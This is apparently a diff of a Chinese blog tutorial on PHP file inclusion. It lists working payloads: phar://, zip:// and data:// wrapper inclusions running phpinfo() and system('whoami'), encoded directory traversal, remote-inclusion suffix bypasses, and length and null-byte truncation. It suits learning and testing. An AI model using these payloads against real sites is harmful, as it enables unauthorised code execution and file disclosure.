+<div class="highlight" id="id-4"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">假设有个a</span><span class="o">.</span><span class="nx">zip压缩包，里面有个a</span><span class="o">.</span><span class="nx">txt里面有</span><span class="o">&lt;?</span><span class="nx">php</span> <span class="nx">phpinfo</span><span class="p">();</span><span class="cp">?&gt;</span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">/?file=phar://a.zip/a.txt
+</span></span></span><span class="line"><span class="cl"><span class="err">绝对相对路径都OK
+</span></span></span></code></pre></div><h3 id="zip" class="heading-element">
+  <a href="#zip" class="heading-mark"></a>zip://</h3><blockquote>
+<p>利用条件：</p>
+<p>​	PHP版本&gt;=5.3.0</p>
+<p>​	需要绝对路径，同时编码#为%23</p>
+</blockquote>
+<div class="highlight" id="id-5"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">/?</span><span class="nx">file</span><span class="o">=</span><span class="nx">zip</span><span class="o">://</span><span class="nx">D</span><span class="o">:</span><span class="nx">\wamp64\www\a</span><span class="o">.</span><span class="nx">zip</span><span class="o">%</span><span class="mi">23</span><span class="nx">a</span><span class="o">.</span><span class="nx">txt</span>
+</span></span><span class="line"><span class="cl"><span class="c1">//如果使用相对路径，包含会失败。
+</span></span></span></code></pre></div><h3 id="data" class="heading-element">
+  <a href="#data" class="heading-mark"></a>data://</h3><blockquote>
+<p>利用条件：</p>
+<p>​	1.PHP版本大于5.2</p>
+<p>​	2.allow_url_fopen=on</p>
+<p>​	3.allow_url_include=on</p>
+</blockquote>
+<pre tabindex="0"><code>姿势一：
 	/?file=data:text/plain,&lt;?php phpinfo();?&gt;
 	/?file=data:text/plain,&lt;?php system(&#39;whoami&#39;)?&gt;
 姿势二：
 	/?file=data:text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2b
-	+号的URL编码%2b,base64解码为&lt;?php phpinfo();?&gt;</code></pre><h2 id=3绕过 class=heading-element><a href=#3%e7%bb%95%e8%bf%87 class=heading-mark></a>3.绕过</h2><p>正常平台不可能直接是 <code>include $_GET['file'];</code> 这么简单，一般会指定前后缀</p><h3 id=指定前缀 class=heading-element><a href=#%e6%8c%87%e5%ae%9a%e5%89%8d%e7%bc%80 class=heading-mark></a>指定前缀</h3><pre tabindex=0><code>&lt;?php
+	+号的URL编码%2b,base64解码为&lt;?php phpinfo();?&gt;</code></pre><h2 id="3绕过" class="heading-element">
+  <a href="#3%e7%bb%95%e8%bf%87" class="heading-mark"></a>3.绕过</h2><p>正常平台不可能直接是 <code>include $_GET['file'];</code> 这么简单，一般会指定前后缀</p>
+<h3 id="指定前缀" class="heading-element">
+  <a href="#%e6%8c%87%e5%ae%9a%e5%89%8d%e7%bc%80" class="heading-mark"></a>指定前缀</h3><pre tabindex="0"><code>&lt;?php
     $file = $_GET[&#39;file&#39;];
     include &#39;/var/www/html/&#39;.$file;
-?&gt;</code></pre><h4 id=目录遍历 class=heading-element><a href=#%e7%9b%ae%e5%bd%95%e9%81%8d%e5%8e%86 class=heading-mark></a>目录遍历</h4><p>​ 假设/var/log/test.txt中有代码</p><pre tabindex=0><code>/?file=../../log/test.txt</code></pre><p>​ 服务器会对../等做过滤，可以用编码来绕过</p><pre tabindex=0><code>利用url编码
+?&gt;</code></pre><h4 id="目录遍历" class="heading-element">
+  <a href="#%e7%9b%ae%e5%bd%95%e9%81%8d%e5%8e%86" class="heading-mark"></a>目录遍历</h4><p>​		假设/var/log/test.txt中有代码<!-- raw HTML omitted --></p>
+<pre tabindex="0"><code>/?file=../../log/test.txt</code></pre><p>​	服务器会对../等做过滤，可以用编码来绕过</p>
+<pre tabindex="0"><code>利用url编码
 	../
 		%2e%2e%2f
 		..%2f
@@ -41,20 +302,86 @@ Anonymous</span></span><span class=post-included-in>&nbsp;收录于 <a href=/cat
 	../
 		%252e%252e%252f
 	..\
-		%252e%252e%255c</code></pre><h3 id=指定后缀 class=heading-element><a href=#%e6%8c%87%e5%ae%9a%e5%90%8e%e7%bc%80 class=heading-mark></a>指定后缀</h3><pre tabindex=0><code>测试代码：
+		%252e%252e%255c</code></pre><h3 id="指定后缀" class="heading-element">
+  <a href="#%e6%8c%87%e5%ae%9a%e5%90%8e%e7%bc%80" class="heading-mark"></a>指定后缀</h3><pre tabindex="0"><code>测试代码：
 &lt;?php
     $file = $_GET[&#39;file&#39;];
     include $file.&#39;/test/test.php&#39;;
-?&gt;</code></pre><h4 id=url class=heading-element><a href=#url class=heading-mark></a>URL</h4><p>URL： <code>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</code></p><p>在RFI中，可以利用query或fragment来绕过</p><h5 id=姿势一query class=heading-element><a href=#%e5%a7%bf%e5%8a%bf%e4%b8%80query class=heading-mark></a>姿势一：query(?)</h5><pre tabindex=0><code>/?file=http://xxxx/info.txt?</code></pre><p>则包含的文件为 <code>http://xxxx/info.txt?/test/test.php</code></p><p>问号后面的 <code>/test/test.php</code> 被当做query后缀而被绕过</p><h5 id=姿势二fragment class=heading-element><a href=#%e5%a7%bf%e5%8a%bf%e4%ba%8cfragment class=heading-mark></a>姿势二：fragment(#)</h5><pre tabindex=0><code>/?file=http://xxxx/info.txt%23</code></pre><p>则包含的文件为 <code>http://xxxx/info.txt#/test/test.php</code></p><p>##后面的 <code>/test/test.php</code> 被当做query后缀而被绕过，需要将#编码为%23</p><h4 id=利用协议 class=heading-element><a href=#%e5%88%a9%e7%94%a8%e5%8d%8f%e8%ae%ae class=heading-mark></a>利用协议</h4><pre tabindex=0><code>测试代码：
+?&gt;</code></pre><h4 id="url" class="heading-element">
+  <a href="#url" class="heading-mark"></a>URL</h4><p>URL： <code>protocol :// hostname[:port] / path / [;parameters][?query]#fragment</code></p>
+<p>在RFI中，可以利用query或fragment来绕过</p>
+<h5 id="姿势一query" class="heading-element">
+  <a href="#%e5%a7%bf%e5%8a%bf%e4%b8%80query" class="heading-mark"></a>姿势一：query(?)</h5><pre tabindex="0"><code>/?file=http://xxxx/info.txt?</code></pre><p>则包含的文件为 <code>http://xxxx/info.txt?/test/test.php</code></p>
+<p>问号后面的 <code>/test/test.php</code> 被当做query后缀而被绕过</p>
+<h5 id="姿势二fragment" class="heading-element">
+  <a href="#%e5%a7%bf%e5%8a%bf%e4%ba%8cfragment" class="heading-mark"></a>姿势二：fragment(#)</h5><pre tabindex="0"><code>/?file=http://xxxx/info.txt%23</code></pre><p>则包含的文件为 <code>http://xxxx/info.txt#/test/test.php</code></p>
+<p>##后面的 <code>/test/test.php</code> 被当做query后缀而被绕过，需要将#编码为%23</p>
+<h4 id="利用协议" class="heading-element">
+  <a href="#%e5%88%a9%e7%94%a8%e5%8d%8f%e8%ae%ae" class="heading-mark"></a>利用协议</h4><pre tabindex="0"><code>测试代码：
 &lt;?php
     $file = $_GET[&#39;file&#39;];
     include $file.&#34;phpinfo.txt&#34;;
-?&gt;</code></pre><h5 id=zip-1 class=heading-element><a href=#zip-1 class=heading-mark></a>zip://</h5><ul><li>[访问参数] <code>?file=zip://D:\zip.jpg%23phpinfo</code></li><li>[拼接后]  <code>?file=zip://D:\zip.jpg#phpinfo.txt</code></li></ul><h5 id=phar-1 class=heading-element><a href=#phar-1 class=heading-mark></a>phar://</h5><ul><li>[访问参数] <code>?file=phar://xx.zip/phpinfo</code></li><li>[拼接后]  <code>?file=phar://xx.zip/phpinfo.txt</code></li></ul><p><strong>Example：</strong>
-目录中有a.zip压缩包，内含a.txt，其中包含代码
-构造payload为：</p><pre tabindex=0><code>?file=zip://D:\phpstudy\www\a.zip%23a.txt
-?file=phar://../../a.zip/a.txt</code></pre><h3 id=长度截断 class=heading-element><a href=#%e9%95%bf%e5%ba%a6%e6%88%aa%e6%96%ad class=heading-mark></a>长度截断</h3><p><code>一共有三种：../ ./ 和.(点号)</code></p><p>Windows 256,Linux 4096</p><p>利用条件：php版本&lt;5.2.8</p><p>只要./不断重复()，则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p><pre tabindex=0><code>/?file=././..........././shell.txt</code></pre><h3 id=00截断 class=heading-element><a href=#00%e6%88%aa%e6%96%ad class=heading-mark></a>00截断</h3><p>利用条件：</p><p><code>php版本&lt;5.3.4</code></p><pre tabindex=0><code>/?file=phpinfo.txt%00</code></pre></div><div class=post-footer id=post-footer><div class=post-info><div class=post-info-line><div class=post-info-mod><span title="更新于 2020-11-25 14:58:30">更新于 2020-11-25&nbsp;</span></div><div class=post-info-license><span><a rel="license external nofollow noopener noreferrer" href=https://creativecommons.org/licenses/by-nc-sa/4.0/ target=_blank>CC BY-NC-SA 4.0</a></span></div></div><div class=post-info-line><div class=post-info-md></div><div class=post-info-share><span><a href=javascript:void(0); title="分享到 Twitter" data-sharer=twitter data-url=http://ghostasky.github.io/posts/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/ data-title=文件包含漏洞 data-hashtags=WEB><i class="fa-brands fa-twitter fa-fw" aria-hidden=true></i></a>
-<a href=javascript:void(0); title="分享到 Facebook" data-sharer=facebook data-url=http://ghostasky.github.io/posts/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/ data-hashtag=WEB><i class="fa-brands fa-facebook-square fa-fw" aria-hidden=true></i></a>
-<a href=javascript:void(0); title="分享到 微博" data-sharer=weibo data-url=http://ghostasky.github.io/posts/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/ data-title=文件包含漏洞><i class="fa-brands fa-weibo fa-fw" aria-hidden=true></i></a></span></div></div></div><div class=post-info-more><section class=post-tags><i class="fa-solid fa-tags fa-fw me-1" aria-hidden=true></i><a href=/tags/web/ class=post-tag title="标签 - WEB">WEB</a></section><section><span><a href=javascript:void(0); onclick=window.history.back()>返回</a></span>&nbsp;|&nbsp;<span><a href=/>主页</a></span></section></div><div class=post-nav><a href=/posts/python__requestsocket%E6%A8%A1%E5%9D%97/ class=post-nav-item rel=prev title=Python__request，socket模块><i class="fa-solid fa-angle-left fa-fw" aria-hidden=true></i>Python__request，socket模块</a>
-<a href=/posts/pip%E4%B8%8B%E8%BD%BD%E8%BF%87%E6%85%A2%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/ class=post-nav-item rel=next title=pip下载过慢解决办法>pip下载过慢解决办法<i class="fa-solid fa-angle-right fa-fw" aria-hidden=true></i></a></div></div></article><aside class=toc id=toc-auto aria-label=目录><h2 class=toc-title>目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden=true></i></h2><div class=toc-content id=toc-content-auto></div></aside></main><footer class=footer><div class=footer-container><div class="footer-line powered">由 <a href=https://gohugo.io/ target=_blank rel="external nofollow noopener noreferrer" title="Hugo 0.123.8"><img class=hugo-icon src=/images/hugo.min.svg alt="Hugo logo"> Hugo</a> 强力驱动 | 主题 - <a href=https://github.com/hugo-fixit/FixIt target=_blank rel=external title="FixIt v0.3.2"><img class=fixit-icon src=/images/fixit.min.svg alt="FixIt logo"> FixIt</a></div><div class="footer-line copyright" itemscope itemtype=http://schema.org/CreativeWork><i class="fa-regular fa-copyright fa-fw" aria-hidden=true></i>
-<span itemprop=copyrightYear>2024</span><span class=author itemprop=copyrightHolder>
-<a href=/></a></span></div></div></footer></div><div class=widgets><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role=button aria-label=回到顶部><i class="fa-solid fa-arrow-up fa-fw" aria-hidden=true></i><span class="variant-numeric d-none">0%</span></div></div><div id=mask></div><noscript><div class=noscript-warning>FixIt 主题在启用 JavaScript 的情况下效果最佳。</div></noscript></div><link rel=preload href=/lib/katex/katex.min.css as=style onload='this.removeAttribute("onload"),this.rel="stylesheet"'><noscript><link rel=stylesheet href=/lib/katex/katex.min.css></noscript><link rel=stylesheet href=/lib/cookieconsent/cookieconsent.min.css><script src=/lib/sharer/sharer.min.js async defer></script><script src=/lib/katex/katex.min.js defer></script><script src=/lib/katex/auto-render.min.js defer></script><script src=/lib/katex/copy-tex.min.js defer></script><script src=/lib/katex/mhchem.min.js defer></script><script src=/lib/cookieconsent/cookieconsent.min.js defer></script><script>window.config={code:{copyTitle:"复制到剪贴板",editLockTitle:"锁定可编辑代码块",editUnLockTitle:"解锁可编辑代码块",editable:!0,maxShownLines:10},comment:{enable:!1},cookieconsent:{content:{dismiss:"同意",link:"了解更多",message:"本网站使用 Cookies 来改善您的浏览体验。"},enable:!0,palette:{button:{background:"#f0f0f0"},popup:{background:"#1aa3ff"}},theme:"edgeless"},math:{delimiters:[{display:!0,left:"$$",right:"$$"},{display:!0,left:"\\[",right:"\\]"},{display:!0,left:"\\begin{equation}",right:"\\end{equation}"},{display:!0,left:"\\begin{equation*}",right:"\\end{equation*}"},{display:!0,left:"\\begin{align}",right:"\\end{align}"},{display:!0,left:"\\begin{align*}",right:"\\end{align*}"},{display:!0,left:"\\begin{alignat}",right:"\\end{alignat}"},{display:!0,left:"\\begin{alignat*}",right:"\\end{alignat*}"},{display:!0,left:"\\begin{gather}",right:"\\end{gather}"},{display:!0,left:"\\begin{CD}",right:"\\end{CD}"},{display:!1,left:"$",right:"$"},{display:!1,left:"\\(",right:"\\)"}],strict:!1}}</script><script src=/js/theme.min.js defer></script></body></html>
+?&gt;</code></pre><h5 id="zip-1" class="heading-element">
+  <a href="#zip-1" class="heading-mark"></a>zip://</h5><ul>
+<li>[访问参数] <code>?file=zip://D:\zip.jpg%23phpinfo</code></li>
+<li>[拼接后]  <code>?file=zip://D:\zip.jpg#phpinfo.txt</code></li>
+</ul>
+<h5 id="phar-1" class="heading-element">
+  <a href="#phar-1" class="heading-mark"></a>phar://</h5><ul>
+<li>[访问参数] <code>?file=phar://xx.zip/phpinfo</code></li>
+<li>[拼接后]  <code>?file=phar://xx.zip/phpinfo.txt</code></li>
+</ul>
+<p><strong>Example：</strong>
+目录中有a.zip压缩包，内含a.txt，其中包含代码<!-- raw HTML omitted -->
+构造payload为：</p>
+<pre tabindex="0"><code>?file=zip://D:\phpstudy\www\a.zip%23a.txt
+?file=phar://../../a.zip/a.txt</code></pre><h3 id="长度截断" class="heading-element">
+  <a href="#%e9%95%bf%e5%ba%a6%e6%88%aa%e6%96%ad" class="heading-mark"></a>长度截断</h3><p><code>一共有三种：../     ./    和.(点号)</code></p>
+<p>Windows 256,Linux 4096</p>
+<p>利用条件：php版本&lt;5.2.8</p>
+<p>只要./不断重复()，则后缀<code>/test/test.php</code>，在达到最大值后会被直接丢弃掉。</p>
+<pre tabindex="0"><code>/?file=././..........././shell.txt</code></pre><h3 id="00截断" class="heading-element">
+  <a href="#00%e6%88%aa%e6%96%ad" class="heading-mark"></a>00截断</h3><p>利用条件：</p>
+<p><code>php版本&lt;5.3.4</code></p>
+<pre tabindex="0"><code>/?file=phpinfo.txt%00</code></pre></div><div class="post-footer" id="post-footer">
+  <div class="post-info">
+    <div class="post-info-line">
+      <div class="post-info-mod">
+        <span title="更新于 2020-11-25 14:58:30">更新于 2020-11-25&nbsp;</span>
+      </div><div class="post-info-license">
+            <span><a rel="license external nofollow noopener noreferrer" href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a></span>
+          </div></div><div class="post-info-line">
+        <div class="post-info-md"></div>
+        <div class="post-info-share">
+          <span><a href="javascript:void(0);" title="分享到 Twitter" data-sharer="twitter" data-url="http://ghostasky.github.io/posts/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-title="文件包含漏洞" data-hashtags="WEB"><i class="fa-brands fa-twitter fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 Facebook" data-sharer="facebook" data-url="http://ghostasky.github.io/posts/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-hashtag="WEB"><i class="fa-brands fa-facebook-square fa-fw" aria-hidden="true"></i></a>
+  <a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="http://ghostasky.github.io/posts/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E/" data-title="文件包含漏洞"><i class="fa-brands fa-weibo fa-fw" aria-hidden="true"></i></a>
+  </span>
+        </div>
+      </div></div>
+
+  <div class="post-info-more">
+    <section class="post-tags"><i class="fa-solid fa-tags fa-fw me-1" aria-hidden="true"></i><a href="/tags/web/" class="post-tag" title="标签 - WEB">WEB</a></section>
+    <section>
+      <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+    </section>
+  </div>
+
+  <div class="post-nav"><a href="/posts/python__requestsocket%E6%A8%A1%E5%9D%97/" class="post-nav-item" rel="prev" title="Python__request，socket模块"><i class="fa-solid fa-angle-left fa-fw" aria-hidden="true"></i>Python__request，socket模块</a>
+      <a href="/posts/pip%E4%B8%8B%E8%BD%BD%E8%BF%87%E6%85%A2%E8%A7%A3%E5%86%B3%E5%8A%9E%E6%B3%95/" class="post-nav-item" rel="next" title="pip下载过慢解决办法">pip下载过慢解决办法<i class="fa-solid fa-angle-right fa-fw" aria-hidden="true"></i></a></div>
+</div>
+</article>
+
+  <aside class="toc" id="toc-auto" aria-label="目录"><h2 class="toc-title">目录&nbsp;<i class="toc-icon fa-solid fa-angle-down fa-fw" aria-hidden="true"></i></h2>
+      <div class="toc-content" id="toc-content-auto"></div></aside></main><footer class="footer">
+    <div class="footer-container"><div class="footer-line powered">由 <a href="https://gohugo.io/" target="_blank" rel="external nofollow noopener noreferrer" title="Hugo 0.123.8"><img class="hugo-icon" src="/images/hugo.min.svg" alt="Hugo logo" /> Hugo</a> 强力驱动 | 主题 - <a href="https://github.com/hugo-fixit/FixIt" target="_blank" rel="external" title="FixIt v0.3.2"><img class="fixit-icon" src="/images/fixit.min.svg" alt="FixIt logo" /> FixIt</a>
+        </div><div class="footer-line copyright" itemscope itemtype="http://schema.org/CreativeWork"><i class="fa-regular fa-copyright fa-fw" aria-hidden="true"></i>
+            <span itemprop="copyrightYear">2024</span><span class="author" itemprop="copyrightHolder">
+              <a href="/"></a></span></div></div>
+  </footer></div><div class="widgets"><div class="fixed-buttons animate__faster d-none"><div class="fixed-button back-to-top" role="button" aria-label="回到顶部"><i class="fa-solid fa-arrow-up fa-fw" aria-hidden="true"></i><span class="variant-numeric d-none">0%</span>
+        </div></div><div id="mask"></div><noscript>
+    <div class="noscript-warning">FixIt 主题在启用 JavaScript 的情况下效果最佳。</div>
+  </noscript>
+</div><link rel="preload" href="/lib/katex/katex.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/katex/katex.min.css"></noscript><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script src="/lib/sharer/sharer.min.js" async defer></script><script src="/lib/katex/katex.min.js" defer></script><script src="/lib/katex/auto-render.min.js" defer></script><script src="/lib/katex/copy-tex.min.js" defer></script><script src="/lib/katex/mhchem.min.js" defer></script><script src="/lib/cookieconsent/cookieconsent.min.js" defer></script><script>window.config={"code":{"copyTitle":"复制到剪贴板","editLockTitle":"锁定可编辑代码块","editUnLockTitle":"解锁可编辑代码块","editable":true,"maxShownLines":10},"comment":{"enable":false},"cookieconsent":{"content":{"dismiss":"同意","link":"了解更多","message":"本网站使用 Cookies 来改善您的浏览体验。"},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false}};</script><script src="/js/theme.min.js" defer></script></body>
+</html>
